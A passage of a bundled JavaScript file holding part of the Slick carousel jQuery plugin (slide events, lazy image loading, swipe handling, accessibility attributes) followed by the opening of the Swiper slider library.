        c.changeSlide({
            data: {
                message: "index",
                index: parseInt(a)
            }
        }, b)
    }
    ,
    b.prototype.init = function(b) {
        var c = this;
        a(c.$slider).hasClass("slick-initialized") || (a(c.$slider).addClass("slick-initialized"),
        c.buildRows(),
        c.buildOut(),
        c.setProps(),
        c.startLoad(),
        c.loadSlider(),
        c.initializeEvents(),
        c.updateArrows(),
        c.updateDots(),
        c.checkResponsive(!0),
        c.focusHandler()),
        b && c.$slider.trigger("init", [c]),
        c.options.accessibility === !0 && c.initADA(),
        c.options.autoplay && (c.paused = !1,
        c.autoPlay())
    }
    ,
    b.prototype.initADA = function() {
        var b = this;
        b.$slides.add(b.$slideTrack.find(".slick-cloned")).attr({
            "aria-hidden": "true",
            tabindex: "-1"
        }).find("a, input, button, select").attr({
            tabindex: "-1"
        }),
        b.$slideTrack.attr("role", "listbox"),
        b.$slides.not(b.$slideTrack.find(".slick-cloned")).each(function(c) {
            a(this).attr({
                role: "option",
                "aria-describedby": "slick-slide" + b.instanceUid + c
            })
        }),
        null !== b.$dots && b.$dots.attr("role", "tablist").find("li").each(function(c) {
            a(this).attr({
                role: "presentation",
                "aria-selected": "false",
                "aria-controls": "navigation" + b.instanceUid + c,
                id: "slick-slide" + b.instanceUid + c
            })
        }).first().attr("aria-selected", "true").end().find("button").attr("role", "button").end().closest("div").attr("role", "toolbar"),
        b.activateADA()
    }
    ,
    b.prototype.initArrowEvents = function() {
        var a = this;
        a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && (a.$prevArrow.off("click.slick").on("click.slick", {
            message: "previous"
        }, a.changeSlide),
        a.$nextArrow.off("click.slick").on("click.slick", {
            message: "next"
        }, a.changeSlide))
    }
    ,
    b.prototype.initDotEvents = function() {
        var b = this;
        b.options.dots === !0 && b.slideCount > b.options.slidesToShow && a("li", b.$dots).on("click.slick", {
            message: "index"
        }, b.changeSlide),
        b.options.dots === !0 && b.options.pauseOnDotsHover === !0 && a("li", b.$dots).on("mouseenter.slick", a.proxy(b.interrupt, b, !0)).on("mouseleave.slick", a.proxy(b.interrupt, b, !1))
    }
    ,
    b.prototype.initSlideEvents = function() {
        var b = this;
        b.options.pauseOnHover && (b.$list.on("mouseenter.slick", a.proxy(b.interrupt, b, !0)),
        b.$list.on("mouseleave.slick", a.proxy(b.interrupt, b, !1)))
    }
    ,
    b.prototype.initializeEvents = function() {
        var b = this;
        b.initArrowEvents(),
        b.initDotEvents(),
        b.initSlideEvents(),
        b.$list.on("touchstart.slick mousedown.slick", {
            action: "start"
        }, b.swipeHandler),
        b.$list.on("touchmove.slick mousemove.slick", {
            action: "move"
        }, b.swipeHandler),
        b.$list.on("touchend.slick mouseup.slick", {
            action: "end"
        }, b.swipeHandler),
        b.$list.on("touchcancel.slick mouseleave.slick", {
            action: "end"
        }, b.swipeHandler),
        b.$list.on("click.slick", b.clickHandler),
        a(document).on(b.visibilityChange, a.proxy(b.visibility, b)),
        b.options.accessibility === !0 && b.$list.on("keydown.slick", b.keyHandler),
        b.options.focusOnSelect === !0 && a(b.$slideTrack).children().on("click.slick", b.selectHandler),
        a(window).on("orientationchange.slick.slick-" + b.instanceUid, a.proxy(b.orientationChange, b)),
        a(window).on("resize.slick.slick-" + b.instanceUid, a.proxy(b.resize, b)),
        a("[draggable!=true]", b.$slideTrack).on("dragstart", b.preventDefault),
        a(window).on("load.slick.slick-" + b.instanceUid, b.setPosition),
        a(document).on("ready.slick.slick-" + b.instanceUid, b.setPosition)
    }
    ,
    b.prototype.initUI = function() {
        var a = this;
        a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && (a.$prevArrow.show(),
        a.$nextArrow.show()),
        a.options.dots === !0 && a.slideCount > a.options.slidesToShow && a.$dots.show()
    }
    ,
    b.prototype.keyHandler = function(a) {
        var b = this;
        a.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === a.keyCode && b.options.accessibility === !0 ? b.changeSlide({
            data: {
                message: b.options.rtl === !0 ? "next" : "previous"
            }
        }) : 39 === a.keyCode && b.options.accessibility === !0 && b.changeSlide({
            data: {
                message: b.options.rtl === !0 ? "previous" : "next"
            }
        }))
    }
    ,
    b.prototype.lazyLoad = function() {
        function g(c) {
            a("img[data-lazy]", c).each(function() {
                var c = a(this)
                  , d = a(this).attr("data-lazy")
                  , e = document.createElement("img");
                e.onload = function() {
                    c.animate({
                        opacity: 0
                    }, 100, function() {
                        c.attr("src", d).animate({
                            opacity: 1
                        }, 200, function() {
                            c.removeAttr("data-lazy").removeClass("slick-loading")
                        }),
                        b.$slider.trigger("lazyLoaded", [b, c, d])
                    })
                }
                ,
                e.onerror = function() {
                    c.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),
                    b.$slider.trigger("lazyLoadError", [b, c, d])
                }
                ,
                e.src = d
            })
        }
        var c, d, e, f, b = this;
        b.options.centerMode === !0 ? b.options.infinite === !0 ? (e = b.currentSlide + (b.options.slidesToShow / 2 + 1),
        f = e + b.options.slidesToShow + 2) : (e = Math.max(0, b.currentSlide - (b.options.slidesToShow / 2 + 1)),
        f = 2 + (b.options.slidesToShow / 2 + 1) + b.currentSlide) : (e = b.options.infinite ? b.options.slidesToShow + b.currentSlide : b.currentSlide,
        f = Math.ceil(e + b.options.slidesToShow),
        b.options.fade === !0 && (e > 0 && e--,
        f <= b.slideCount && f++)),
        c = b.$slider.find(".slick-slide").slice(e, f),
        g(c),
        b.slideCount <= b.options.slidesToShow ? (d = b.$slider.find(".slick-slide"),
        g(d)) : b.currentSlide >= b.slideCount - b.options.slidesToShow ? (d = b.$slider.find(".slick-cloned").slice(0, b.options.slidesToShow),
        g(d)) : 0 === b.currentSlide && (d = b.$slider.find(".slick-cloned").slice(-1 * b.options.slidesToShow),
        g(d))
    }
    ,
    b.prototype.loadSlider = function() {
        var a = this;
        a.setPosition(),
        a.$slideTrack.css({
            opacity: 1
        }),
        a.$slider.removeClass("slick-loading"),
        a.initUI(),
        "progressive" === a.options.lazyLoad && a.progressiveLazyLoad()
    }
    ,
    b.prototype.next = b.prototype.slickNext = function() {
        var a = this;
        a.changeSlide({
            data: {
                message: "next"
            }
        })
    }
    ,
    b.prototype.orientationChange = function() {
        var a = this;
        a.checkResponsive(),
        a.setPosition()
    }
    ,
    b.prototype.pause = b.prototype.slickPause = function() {
        var a = this;
        a.autoPlayClear(),
        a.paused = !0
    }
    ,
    b.prototype.play = b.prototype.slickPlay = function() {
        var a = this;
        a.autoPlay(),
        a.options.autoplay = !0,
        a.paused = !1,
        a.focussed = !1,
        a.interrupted = !1
    }
    ,
    b.prototype.postSlide = function(a) {
        var b = this;
        b.unslicked || (b.$slider.trigger("afterChange", [b, a]),
        b.animating = !1,
        b.setPosition(),
        b.swipeLeft = null,
        b.options.autoplay && b.autoPlay(),
        b.options.accessibility === !0 && b.initADA())
    }
    ,
    b.prototype.prev = b.prototype.slickPrev = function() {
        var a = this;
        a.changeSlide({
            data: {
                message: "previous"
            }
        })
    }
    ,
    b.prototype.preventDefault = function(a) {
        a.preventDefault()
    }
    ,
    b.prototype.progressiveLazyLoad = function(b) {
        b = b || 1;
        var e, f, g, c = this, d = a("img[data-lazy]", c.$slider);
        d.length ? (e = d.first(),
        f = e.attr("data-lazy"),
        g = document.createElement("img"),
        g.onload = function() {
            e.attr("src", f).removeAttr("data-lazy").removeClass("slick-loading"),
            c.options.adaptiveHeight === !0 && c.setPosition(),
            c.$slider.trigger("lazyLoaded", [c, e, f]),
            c.progressiveLazyLoad()
        }
        ,
        g.onerror = function() {
            3 > b ? setTimeout(function() {
                c.progressiveLazyLoad(b + 1)
            }, 500) : (e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),
            c.$slider.trigger("lazyLoadError", [c, e, f]),
            c.progressiveLazyLoad())
        }
        ,
        g.src = f) : c.$slider.trigger("allImagesLoaded", [c])
    }
    ,
    b.prototype.refresh = function(b) {
        var d, e, c = this;
        e = c.slideCount - c.options.slidesToShow,
        !c.options.infinite && c.currentSlide > e && (c.currentSlide = e),
        c.slideCount <= c.options.slidesToShow && (c.currentSlide = 0),
        d = c.currentSlide,
        c.destroy(!0),
        a.extend(c, c.initials, {
            currentSlide: d
        }),
        c.init(),
        b || c.changeSlide({
            data: {
                message: "index",
                index: d
            }
        }, !1)
    }
    ,
    b.prototype.registerBreakpoints = function() {
        var c, d, e, b = this, f = b.options.responsive || null;
        if ("array" === a.type(f) && f.length) {
            b.respondTo = b.options.respondTo || "window";
            for (c in f)
                if (e = b.breakpoints.length - 1,
                d = f[c].breakpoint,
                f.hasOwnProperty(c)) {
                    for (; e >= 0; )
                        b.breakpoints[e] && b.breakpoints[e] === d && b.breakpoints.splice(e, 1),
                        e--;
                    b.breakpoints.push(d),
                    b.breakpointSettings[d] = f[c].settings
                }
            b.breakpoints.sort(function(a, c) {
                return b.options.mobileFirst ? a - c : c - a
            })
        }
    }
    ,
    b.prototype.reinit = function() {
        var b = this;
        b.$slides = b.$slideTrack.children(b.options.slide).addClass("slick-slide"),
        b.slideCount = b.$slides.length,
        b.currentSlide >= b.slideCount && 0 !== b.currentSlide && (b.currentSlide = b.currentSlide - b.options.slidesToScroll),
        b.slideCount <= b.options.slidesToShow && (b.currentSlide = 0),
        b.registerBreakpoints(),
        b.setProps(),
        b.setupInfinite(),
        b.buildArrows(),
        b.updateArrows(),
        b.initArrowEvents(),
        b.buildDots(),
        b.updateDots(),
        b.initDotEvents(),
        b.cleanUpSlideEvents(),
        b.initSlideEvents(),
        b.checkResponsive(!1, !0),
        b.options.focusOnSelect === !0 && a(b.$slideTrack).children().on("click.slick", b.selectHandler),
        b.setSlideClasses("number" == typeof b.currentSlide ? b.currentSlide : 0),
        b.setPosition(),
        b.focusHandler(),
        b.paused = !b.options.autoplay,
        b.autoPlay(),
        b.$slider.trigger("reInit", [b])
    }
    ,
    b.prototype.resize = function() {
        var b = this;
        a(window).width() !== b.windowWidth && (clearTimeout(b.windowDelay),
        b.windowDelay = window.setTimeout(function() {
            b.windowWidth = a(window).width(),
            b.checkResponsive(),
            b.unslicked || b.setPosition()
        }, 50))
    }
    ,
    b.prototype.removeSlide = b.prototype.slickRemove = function(a, b, c) {
        var d = this;
        return "boolean" == typeof a ? (b = a,
        a = b === !0 ? 0 : d.slideCount - 1) : a = b === !0 ? --a : a,
        d.slideCount < 1 || 0 > a || a > d.slideCount - 1 ? !1 : (d.unload(),
        c === !0 ? d.$slideTrack.children().remove() : d.$slideTrack.children(this.options.slide).eq(a).remove(),
        d.$slides = d.$slideTrack.children(this.options.slide),
        d.$slideTrack.children(this.options.slide).detach(),
        d.$slideTrack.append(d.$slides),
        d.$slidesCache = d.$slides,
        void d.reinit())
    }
    ,
    b.prototype.setCSS = function(a) {
        var d, e, b = this, c = {};
        b.options.rtl === !0 && (a = -a),
        d = "left" == b.positionProp ? Math.ceil(a) + "px" : "0px",
        e = "top" == b.positionProp ? Math.ceil(a) + "px" : "0px",
        c[b.positionProp] = a,
        b.transformsEnabled === !1 ? b.$slideTrack.css(c) : (c = {},
        b.cssTransitions === !1 ? (c[b.animType] = "translate(" + d + ", " + e + ")",
        b.$slideTrack.css(c)) : (c[b.animType] = "translate3d(" + d + ", " + e + ", 0px)",
        b.$slideTrack.css(c)))
    }
    ,
    b.prototype.setDimensions = function() {
        var a = this;
        a.options.vertical === !1 ? a.options.centerMode === !0 && a.$list.css({
            padding: "0px " + a.options.centerPadding
        }) : (a.$list.height(a.$slides.first().outerHeight(!0) * a.options.slidesToShow),
        a.options.centerMode === !0 && a.$list.css({
            padding: a.options.centerPadding + " 0px"
        })),
        a.listWidth = a.$list.width(),
        a.listHeight = a.$list.height(),
        a.options.vertical === !1 && a.options.variableWidth === !1 ? (a.slideWidth = Math.ceil(a.listWidth / a.options.slidesToShow),
        a.$slideTrack.width(Math.ceil(a.slideWidth * a.$slideTrack.children(".slick-slide").length))) : a.options.variableWidth === !0 ? a.$slideTrack.width(5e3 * a.slideCount) : (a.slideWidth = Math.ceil(a.listWidth),
        a.$slideTrack.height(Math.ceil(a.$slides.first().outerHeight(!0) * a.$slideTrack.children(".slick-slide").length)));
        var b = a.$slides.first().outerWidth(!0) - a.$slides.first().width();
        a.options.variableWidth === !1 && a.$slideTrack.children(".slick-slide").width(a.slideWidth - b)
    }
    ,
    b.prototype.setFade = function() {
        var c, b = this;
        b.$slides.each(function(d, e) {
            c = b.slideWidth * d * -1,
            b.options.rtl === !0 ? a(e).css({
                position: "relative",
                right: c,
                top: 0,
                zIndex: b.options.zIndex - 2,
                opacity: 0
            }) : a(e).css({
                position: "relative",
                left: c,
                top: 0,
                zIndex: b.options.zIndex - 2,
                opacity: 0
            })
        }),
        b.$slides.eq(b.currentSlide).css({
            zIndex: b.options.zIndex - 1,
            opacity: 1
        })
    }
    ,
    b.prototype.setHeight = function() {
        var a = this;
        if (1 === a.options.slidesToShow && a.options.adaptiveHeight === !0 && a.options.vertical === !1) {
            var b = a.$slides.eq(a.currentSlide).outerHeight(!0);
            a.$list.css("height", b)
        }
    }
    ,
    b.prototype.setOption = b.prototype.slickSetOption = function() {
        var c, d, e, f, h, b = this, g = !1;
        if ("object" === a.type(arguments[0]) ? (e = arguments[0],
        g = arguments[1],
        h = "multiple") : "string" === a.type(arguments[0]) && (e = arguments[0],
        f = arguments[1],
        g = arguments[2],
        "responsive" === arguments[0] && "array" === a.type(arguments[1]) ? h = "responsive" : "undefined" != typeof arguments[1] && (h = "single")),
        "single" === h)
            b.options[e] = f;
        else if ("multiple" === h)
            a.each(e, function(a, c) {
                b.options[a] = c
            });
        else if ("responsive" === h)
            for (d in f)
                if ("array" !== a.type(b.options.responsive))
                    b.options.responsive = [f[d]];
                else {
                    for (c = b.options.responsive.length - 1; c >= 0; )
                        b.options.responsive[c].breakpoint === f[d].breakpoint && b.options.responsive.splice(c, 1),
                        c--;
                    b.options.responsive.push(f[d])
                }
        g && (b.unload(),
        b.reinit())
    }
    ,
    b.prototype.setPosition = function() {
        var a = this;
        a.setDimensions(),
        a.setHeight(),
        a.options.fade === !1 ? a.setCSS(a.getLeft(a.currentSlide)) : a.setFade(),
        a.$slider.trigger("setPosition", [a])
    }
    ,
    b.prototype.setProps = function() {
        var a = this
          , b = document.body.style;
        a.positionProp = a.options.vertical === !0 ? "top" : "left",
        "top" === a.positionProp ? a.$slider.addClass("slick-vertical") : a.$slider.removeClass("slick-vertical"),
        (void 0 !== b.WebkitTransition || void 0 !== b.MozTransition || void 0 !== b.msTransition) && a.options.useCSS === !0 && (a.cssTransitions = !0),
        a.options.fade && ("number" == typeof a.options.zIndex ? a.options.zIndex < 3 && (a.options.zIndex = 3) : a.options.zIndex = a.defaults.zIndex),
        void 0 !== b.OTransform && (a.animType = "OTransform",
        a.transformType = "-o-transform",
        a.transitionType = "OTransition",
        void 0 === b.perspectiveProperty && void 0 === b.webkitPerspective && (a.animType = !1)),
        void 0 !== b.MozTransform && (a.animType = "MozTransform",
        a.transformType = "-moz-transform",
        a.transitionType = "MozTransition",
        void 0 === b.perspectiveProperty && void 0 === b.MozPerspective && (a.animType = !1)),
        void 0 !== b.webkitTransform && (a.animType = "webkitTransform",
        a.transformType = "-webkit-transform",
        a.transitionType = "webkitTransition",
        void 0 === b.perspectiveProperty && void 0 === b.webkitPerspective && (a.animType = !1)),
        void 0 !== b.msTransform && (a.animType = "msTransform",
        a.transformType = "-ms-transform",
        a.transitionType = "msTransition",
        void 0 === b.msTransform && (a.animType = !1)),
        void 0 !== b.transform && a.animType !== !1 && (a.animType = "transform",
        a.transformType = "transform",
        a.transitionType = "transition"),
        a.transformsEnabled = a.options.useTransform && null !== a.animType && a.animType !== !1
    }
    ,
    b.prototype.setSlideClasses = function(a) {
        var c, d, e, f, b = this;
        d = b.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"),
        b.$slides.eq(a).addClass("slick-current"),
        b.options.centerMode === !0 ? (c = Math.floor(b.options.slidesToShow / 2),
        b.options.infinite === !0 && (a >= c && a <= b.slideCount - 1 - c ? b.$slides.slice(a - c, a + c + 1).addClass("slick-active").attr("aria-hidden", "false") : (e = b.options.slidesToShow + a,
        d.slice(e - c + 1, e + c + 2).addClass("slick-active").attr("aria-hidden", "false")),
        0 === a ? d.eq(d.length - 1 - b.options.slidesToShow).addClass("slick-center") : a === b.slideCount - 1 && d.eq(b.options.slidesToShow).addClass("slick-center")),
        b.$slides.eq(a).addClass("slick-center")) : a >= 0 && a <= b.slideCount - b.options.slidesToShow ? b.$slides.slice(a, a + b.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : d.length <= b.options.slidesToShow ? d.addClass("slick-active").attr("aria-hidden", "false") : (f = b.slideCount % b.options.slidesToShow,
        e = b.options.infinite === !0 ? b.options.slidesToShow + a : a,
        b.options.slidesToShow == b.options.slidesToScroll && b.slideCount - a < b.options.slidesToShow ? d.slice(e - (b.options.slidesToShow - f), e + f).addClass("slick-active").attr("aria-hidden", "false") : d.slice(e, e + b.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false")),
        "ondemand" === b.options.lazyLoad && b.lazyLoad()
    }
    ,
    b.prototype.setupInfinite = function() {
        var c, d, e, b = this;
        if (b.options.fade === !0 && (b.options.centerMode = !1),
        b.options.infinite === !0 && b.options.fade === !1 && (d = null,
        b.slideCount > b.options.slidesToShow)) {
            for (e = b.options.centerMode === !0 ? b.options.slidesToShow + 1 : b.options.slidesToShow,
            c = b.slideCount; c > b.slideCount - e; c -= 1)
                d = c - 1,
                a(b.$slides[d]).clone(!0).attr("id", "").attr("data-slick-index", d - b.slideCount).prependTo(b.$slideTrack).addClass("slick-cloned");
            for (c = 0; e > c; c += 1)
                d = c,
                a(b.$slides[d]).clone(!0).attr("id", "").attr("data-slick-index", d + b.slideCount).appendTo(b.$slideTrack).addClass("slick-cloned");
            b.$slideTrack.find(".slick-cloned").find("[id]").each(function() {
                a(this).attr("id", "")
            })
        }
    }
    ,
    b.prototype.interrupt = function(a) {
        var b = this;
        a || b.autoPlay(),
        b.interrupted = a
    }
    ,
    b.prototype.selectHandler = function(b) {
        var c = this
          , d = a(b.target).is(".slick-slide") ? a(b.target) : a(b.target).parents(".slick-slide")
          , e = parseInt(d.attr("data-slick-index"));
        return e || (e = 0),
        c.slideCount <= c.options.slidesToShow ? (c.setSlideClasses(e),
        void c.asNavFor(e)) : void c.slideHandler(e)
    }
    ,
    b.prototype.slideHandler = function(a, b, c) {
        var d, e, f, g, j, h = null, i = this;
        return b = b || !1,
        i.animating === !0 && i.options.waitForAnimate === !0 || i.options.fade === !0 && i.currentSlide === a || i.slideCount <= i.options.slidesToShow ? void 0 : (b === !1 && i.asNavFor(a),
        d = a,
        h = i.getLeft(d),
        g = i.getLeft(i.currentSlide),
        i.currentLeft = null === i.swipeLeft ? g : i.swipeLeft,
        i.options.infinite === !1 && i.options.centerMode === !1 && (0 > a || a > i.getDotCount() * i.options.slidesToScroll) ? void (i.options.fade === !1 && (d = i.currentSlide,
        c !== !0 ? i.animateSlide(g, function() {
            i.postSlide(d)
        }) : i.postSlide(d))) : i.options.infinite === !1 && i.options.centerMode === !0 && (0 > a || a > i.slideCount - i.options.slidesToScroll) ? void (i.options.fade === !1 && (d = i.currentSlide,
        c !== !0 ? i.animateSlide(g, function() {
            i.postSlide(d)
        }) : i.postSlide(d))) : (i.options.autoplay && clearInterval(i.autoPlayTimer),
        e = 0 > d ? i.slideCount % i.options.slidesToScroll !== 0 ? i.slideCount - i.slideCount % i.options.slidesToScroll : i.slideCount + d : d >= i.slideCount ? i.slideCount % i.options.slidesToScroll !== 0 ? 0 : d - i.slideCount : d,
        i.animating = !0,
        i.$slider.trigger("beforeChange", [i, i.currentSlide, e]),
        f = i.currentSlide,
        i.currentSlide = e,
        i.setSlideClasses(i.currentSlide),
        i.options.asNavFor && (j = i.getNavTarget(),
        j = j.slick("getSlick"),
        j.slideCount <= j.options.slidesToShow && j.setSlideClasses(i.currentSlide)),
        i.updateDots(),
        i.updateArrows(),
        i.options.fade === !0 ? (c !== !0 ? (i.fadeSlideOut(f),
        i.fadeSlide(e, function() {
            i.postSlide(e)
        })) : i.postSlide(e),
        void i.animateHeight()) : void (c !== !0 ? i.animateSlide(h, function() {
            i.postSlide(e)
        }) : i.postSlide(e))))
    }
    ,
    b.prototype.startLoad = function() {
        var a = this;
        a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && (a.$prevArrow.hide(),
        a.$nextArrow.hide()),
        a.options.dots === !0 && a.slideCount > a.options.slidesToShow && a.$dots.hide(),
        a.$slider.addClass("slick-loading")
    }
    ,
    b.prototype.swipeDirection = function() {
        var a, b, c, d, e = this;
        return a = e.touchObject.startX - e.touchObject.curX,
        b = e.touchObject.startY - e.touchObject.curY,
        c = Math.atan2(b, a),
        d = Math.round(180 * c / Math.PI),
        0 > d && (d = 360 - Math.abs(d)),
        45 >= d && d >= 0 ? e.options.rtl === !1 ? "left" : "right" : 360 >= d && d >= 315 ? e.options.rtl === !1 ? "left" : "right" : d >= 135 && 225 >= d ? e.options.rtl === !1 ? "right" : "left" : e.options.verticalSwiping === !0 ? d >= 35 && 135 >= d ? "down" : "up" : "vertical"
    }
    ,
    b.prototype.swipeEnd = function(a) {
        var c, d, b = this;
        if (b.dragging = !1,
        b.interrupted = !1,
        b.shouldClick = b.touchObject.swipeLength > 10 ? !1 : !0,
        void 0 === b.touchObject.curX)
            return !1;
        if (b.touchObject.edgeHit === !0 && b.$slider.trigger("edge", [b, b.swipeDirection()]),
        b.touchObject.swipeLength >= b.touchObject.minSwipe) {
            switch (d = b.swipeDirection()) {
            case "left":
            case "down":
                c = b.options.swipeToSlide ? b.checkNavigable(b.currentSlide + b.getSlideCount()) : b.currentSlide + b.getSlideCount(),
                b.currentDirection = 0;
                break;
            case "right":
            case "up":
                c = b.options.swipeToSlide ? b.checkNavigable(b.currentSlide - b.getSlideCount()) : b.currentSlide - b.getSlideCount(),
                b.currentDirection = 1
            }
            "vertical" != d && (b.slideHandler(c),
            b.touchObject = {},
            b.$slider.trigger("swipe", [b, d]))
        } else
            b.touchObject.startX !== b.touchObject.curX && (b.slideHandler(b.currentSlide),
            b.touchObject = {})
    }
    ,
    b.prototype.swipeHandler = function(a) {
        var b = this;
        if (!(b.options.swipe === !1 || "ontouchend"in document && b.options.swipe === !1 || b.options.draggable === !1 && -1 !== a.type.indexOf("mouse")))
            switch (b.touchObject.fingerCount = a.originalEvent && void 0 !== a.originalEvent.touches ? a.originalEvent.touches.length : 1,
            b.touchObject.minSwipe = b.listWidth / b.options.touchThreshold,
            b.options.verticalSwiping === !0 && (b.touchObject.minSwipe = b.listHeight / b.options.touchThreshold),
            a.data.action) {
            case "start":
                b.swipeStart(a);
                break;
            case "move":
                b.swipeMove(a);
                break;
            case "end":
                b.swipeEnd(a)
            }
    }
    ,
    b.prototype.swipeMove = function(a) {
        var d, e, f, g, h, b = this;
        return h = void 0 !== a.originalEvent ? a.originalEvent.touches : null,
        !b.dragging || h && 1 !== h.length ? !1 : (d = b.getLeft(b.currentSlide),
        b.touchObject.curX = void 0 !== h ? h[0].pageX : a.clientX,
        b.touchObject.curY = void 0 !== h ? h[0].pageY : a.clientY,
        b.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(b.touchObject.curX - b.touchObject.startX, 2))),
        b.options.verticalSwiping === !0 && (b.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(b.touchObject.curY - b.touchObject.startY, 2)))),
        e = b.swipeDirection(),
        "vertical" !== e ? (void 0 !== a.originalEvent && b.touchObject.swipeLength > 4 && a.preventDefault(),
        g = (b.options.rtl === !1 ? 1 : -1) * (b.touchObject.curX > b.touchObject.startX ? 1 : -1),
        b.options.verticalSwiping === !0 && (g = b.touchObject.curY > b.touchObject.startY ? 1 : -1),
        f = b.touchObject.swipeLength,
        b.touchObject.edgeHit = !1,
        b.options.infinite === !1 && (0 === b.currentSlide && "right" === e || b.currentSlide >= b.getDotCount() && "left" === e) && (f = b.touchObject.swipeLength * b.options.edgeFriction,
        b.touchObject.edgeHit = !0),
        b.options.vertical === !1 ? b.swipeLeft = d + f * g : b.swipeLeft = d + f * (b.$list.height() / b.listWidth) * g,
        b.options.verticalSwiping === !0 && (b.swipeLeft = d + f * g),
        b.options.fade === !0 || b.options.touchMove === !1 ? !1 : b.animating === !0 ? (b.swipeLeft = null,
        !1) : void b.setCSS(b.swipeLeft)) : void 0)
    }
    ,
    b.prototype.swipeStart = function(a) {
        var c, b = this;
        return b.interrupted = !0,
        1 !== b.touchObject.fingerCount || b.slideCount <= b.options.slidesToShow ? (b.touchObject = {},
        !1) : (void 0 !== a.originalEvent && void 0 !== a.originalEvent.touches && (c = a.originalEvent.touches[0]),
        b.touchObject.startX = b.touchObject.curX = void 0 !== c ? c.pageX : a.clientX,
        b.touchObject.startY = b.touchObject.curY = void 0 !== c ? c.pageY : a.clientY,
        void (b.dragging = !0))
    }
    ,
    b.prototype.unfilterSlides = b.prototype.slickUnfilter = function() {
        var a = this;
        null !== a.$slidesCache && (a.unload(),
        a.$slideTrack.children(this.options.slide).detach(),
        a.$slidesCache.appendTo(a.$slideTrack),
        a.reinit())
    }
    ,
    b.prototype.unload = function() {
        var b = this;
        a(".slick-cloned", b.$slider).remove(),
        b.$dots && b.$dots.remove(),
        b.$prevArrow && b.htmlExpr.test(b.options.prevArrow) && b.$prevArrow.remove(),
        b.$nextArrow && b.htmlExpr.test(b.options.nextArrow) && b.$nextArrow.remove(),
        b.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
    }
    ,
    b.prototype.unslick = function(a) {
        var b = this;
        b.$slider.trigger("unslick", [b, a]),
        b.destroy()
    }
    ,
    b.prototype.updateArrows = function() {
        var b, a = this;
        b = Math.floor(a.options.slidesToShow / 2),
        a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && !a.options.infinite && (a.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
        a.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
        0 === a.currentSlide ? (a.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"),
        a.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : a.currentSlide >= a.slideCount - a.options.slidesToShow && a.options.centerMode === !1 ? (a.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"),
        a.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : a.currentSlide >= a.slideCount - 1 && a.options.centerMode === !0 && (a.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"),
        a.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
    }
    ,
    b.prototype.updateDots = function() {
        var a = this;
        null !== a.$dots && (a.$dots.find("li").removeClass("slick-active").attr("aria-hidden", "true"),
        a.$dots.find("li").eq(Math.floor(a.currentSlide / a.options.slidesToScroll)).addClass("slick-active").attr("aria-hidden", "false"))
    }
    ,
    b.prototype.visibility = function() {
        var a = this;
        a.options.autoplay && (document[a.hidden] ? a.interrupted = !0 : a.interrupted = !1)
    }
    ,
    a.fn.slick = function() {
        var f, g, a = this, c = arguments[0], d = Array.prototype.slice.call(arguments, 1), e = a.length;
        for (f = 0; e > f; f++)
            if ("object" == typeof c || "undefined" == typeof c ? a[f].slick = new b(a[f],c) : g = a[f].slick[c].apply(a[f].slick, d),
            "undefined" != typeof g)
                return g;
        return a
    }
});
!function(e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = e || self).Swiper = t()
}(this, function() {
    "use strict";
    var e = "undefined" == typeof document ? {
        body: {},
        addEventListener: function() {},
        removeEventListener: function() {},
        activeElement: {
            blur: function() {},
            nodeName: ""
        },
        querySelector: function() {
            return null
        },
        querySelectorAll: function() {
            return []
        },
        getElementById: function() {
            return null
        },
        createEvent: function() {
            return {
                initEvent: function() {}
            }
        },
        createElement: function() {
            return {
                children: [],
                childNodes: [],
                style: {},
                setAttribute: function() {},
                getElementsByTagName: function() {
                    return []
                }
            }
        },
        location: {
            hash: ""
        }
    } : document
      , t = "undefined" == typeof window ? {
        document: e,
        navigator: {
            userAgent: ""
        },
        location: {},
        history: {},
        CustomEvent: function() {
            return this
        },
        addEventListener: function() {},
        removeEventListener: function() {},
        getComputedStyle: function() {
            return {
                getPropertyValue: function() {
                    return ""
                }
            }
        },
        Image: function() {},
        Date: function() {},
        screen: {},
        setTimeout: function() {},
        clearTimeout: function() {}
    } : window
      , i = function(e) {
        for (var t = 0; t < e.length; t += 1)
            this[t] = e[t];
        return this.length = e.length,
        this
    };
    function s(s, a) {
        var r = []
          , n = 0;
        if (s && !a && s instanceof i)
            return s;
        if (s)
            if ("string" == typeof s) {
                var o, l, d = s.trim();
                if (d.indexOf("<") >= 0 && d.indexOf(">") >= 0) {
                    var h = "div";
                    for (0 === d.indexOf("<li") && (h = "ul"),
                    0 === d.indexOf("<tr") && (h = "tbody"),
                    0 !== d.indexOf("<td") && 0 !== d.indexOf("<th") || (h = "tr"),
                    0 === d.indexOf("<tbody") && (h = "table"),
                    0 === d.indexOf("<option") && (h = "select"),
                    (l = e.createElement(h)).innerHTML = d,
                    n = 0; n < l.childNodes.length; n += 1)
                        r.push(l.childNodes[n])
                } else
                    for (o = a || "#" !== s[0] || s.match(/[ .<>:~]/) ? (a || e).querySelectorAll(s.trim()) : [e.getElementById(s.trim().split("#")[1])],
                    n = 0; n < o.length; n += 1)
                        o[n] && r.push(o[n])
            } else if (s.nodeType || s === t || s === e)
                r.push(s);
            else if (s.length > 0 && s[0].nodeType)
                for (n = 0; n < s.length; n += 1)
                    r.push(s[n]);
        return new i(r)
    }
    function a(e) {
